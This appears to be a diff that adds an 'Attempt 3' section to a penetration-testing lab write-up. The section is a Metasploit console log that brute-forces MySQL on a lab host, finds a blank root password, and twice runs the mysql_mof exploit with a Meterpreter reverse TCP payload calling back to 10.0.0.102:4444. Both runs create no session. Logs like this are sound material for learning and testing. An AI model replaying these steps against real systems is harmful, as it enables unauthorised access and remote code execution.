@@ -402,3 +402,88 @@ Everyone                               Well-known group S-1-1-0      Mandatory g
 NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
 Mandatory Label\System Mandatory Level Label            S-1-16-16384
 ```
+
+## Attempt 3: MySQL login brute force and exploit (didn't work)
+
+```bash
+msf exploit(multi/elasticsearch/script_mvel_rce) > use auxiliary/scanner/mysql/mysql_login
+[*] New in Metasploit 6.4 - The CreateSession option within this module can open an interactive session
+msf auxiliary(scanner/mysql/mysql_login) > options
+
+Module options (auxiliary/scanner/mysql/mysql_login):
+
+   Name              Current Setting  Required  Description
+   ----              ---------------  --------  -----------
+   ANONYMOUS_LOGIN   false            yes       Attempt to login with a blank username and password
+   BLANK_PASSWORDS   true             no        Try blank passwords for all users
+   BRUTEFORCE_SPEED  5                yes       How fast to bruteforce, from 0 to 5
+   CreateSession     false            no        Create a new session for every successful login
+   DB_ALL_CREDS      false            no        Try each user/password couple stored in the current database
+   DB_ALL_PASS       false            no        Add all passwords in the current database to the list
+   DB_ALL_USERS      false            no        Add all users in the current database to the list
+   DB_SKIP_EXISTING  none             no        Skip existing credentials stored in the current database (Accepted: none, user, user&realm)
+   PASSWORD                           no        A specific password to authenticate with
+   PASS_FILE                          no        File containing passwords, one per line
+   Proxies                            no        A proxy chain of format type:host:port[,type:host:port][...]. Supported proxies: socks5, socks5h, sapni, http, socks4
+   RHOSTS                             yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
+   RPORT             3306             yes       The target port (TCP)
+   STOP_ON_SUCCESS   false            yes       Stop guessing when a credential works for a host
+   THREADS           1                yes       The number of concurrent threads (max one per host)
+   USERNAME          root             no        A specific username to authenticate as
+   USERPASS_FILE                      no        File containing users and passwords separated by space, one pair per line
+   USER_AS_PASS      false            no        Try the username as the password for all users
+   USER_FILE                          no        File containing usernames, one per line
+   VERBOSE           true             yes       Whether to print output for all attempts
+
+
+View the full module info with the info, or info -d command.
+
+msf auxiliary(scanner/mysql/mysql_login) > set RHOSTS 10.0.0.93
+RHOSTS => 10.0.0.93
+msf auxiliary(scanner/mysql/mysql_login) > run
+[+] 10.0.0.93:3306        - 10.0.0.93:3306 - Found remote MySQL version 5.5.20
+[+] 10.0.0.93:3306        - 10.0.0.93:3306 - Success: 'root:'
+[*] 10.0.0.93:3306        - Scanned 1 of 1 hosts (100% complete)
+[*] 10.0.0.93:3306        - Bruteforce completed, 1 credential was successful.
+[*] 10.0.0.93:3306        - You can open an MySQL session with these credentials and CreateSession set to true
+[-] Auxiliary failed: NoMethodError undefined method 'name' for an instance of String
+[-] Call stack:
+[-]   /snap/metasploit-framework/2173/opt/metasploit-framework/embedded/framework/lib/msf/core/module/failure.rb:56:in 'Msf::Module::Failure#report_failure'
+msf auxiliary(scanner/mysql/mysql_login) > creds
+Credentials
+===========
+
+id  host       origin     service           public  private  realm  private_type    JtR Format  cracked_password
+--  ----       ------     -------           ------  -------  -----  ------------    ----------  ----------------
+1   10.0.0.93  10.0.0.93  3306/tcp (mysql)  root                    Blank password
+
+msf exploit(windows/mysql/mysql_mof) > use exploit/windows/mysql/mysql_start_up
+[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
+[*] New in Metasploit 6.4 - This module can target a SESSION or an RHOST
+msf exploit(windows/mysql/mysql_start_up) > set RHOSTS 10.0.0.93
+
+msf exploit(windows/mysql/mysql_start_up) > use exploit/windows/mysql/mysql_mof
+[*] Using configured payload windows/meterpreter/reverse_tcp
+[*] New in Metasploit 6.4 - This module can target a SESSION or an RHOST
+msf exploit(windows/mysql/mysql_mof) > set RHOSTS 10.0.0.93
+RHOSTS => 10.0.0.93
+msf exploit(windows/mysql/mysql_mof) > run
+[*] Started reverse TCP handler on 10.0.0.102:4444 
+[*] 10.0.0.93:3306 - Attempting to login as 'root:'
+[*] 10.0.0.93:3306 - Uploading to 'C:/windows/system32/WlcaI.exe'
+[*] 10.0.0.93:3306 - Uploading to 'C:/windows/system32/wbem/mof/pZeIv.mof'
+[!] 10.0.0.93:3306 - This exploit may require manual cleanup of 'WlcaI.exe' on the target
+[!] 10.0.0.93:3306 - This exploit may require manual cleanup of 'wbem\mof\good\pZeIv.mof' on the target
+[*] Exploit completed, but no session was created.
+msf exploit(windows/mysql/mysql_mof) > use exploit/windows/mysql/mysql_mof
+[*] Using configured payload windows/meterpreter/reverse_tcp
+[*] New in Metasploit 6.4 - This module can target a SESSION or an RHOST
+msf exploit(windows/mysql/mysql_mof) > run
+[*] Started reverse TCP handler on 10.0.0.102:4444 
+[*] 10.0.0.93:3306 - Attempting to login as 'root:'
+[*] 10.0.0.93:3306 - Uploading to 'C:/windows/system32/mNUKc.exe'
+[*] 10.0.0.93:3306 - Uploading to 'C:/windows/system32/wbem/mof/zZlqz.mof'
+[!] 10.0.0.93:3306 - This exploit may require manual cleanup of 'mNUKc.exe' on the target
+[!] 10.0.0.93:3306 - This exploit may require manual cleanup of 'wbem\mof\good\zZlqz.mof' on the target
+[*] Exploit completed, but no session was created.
+```
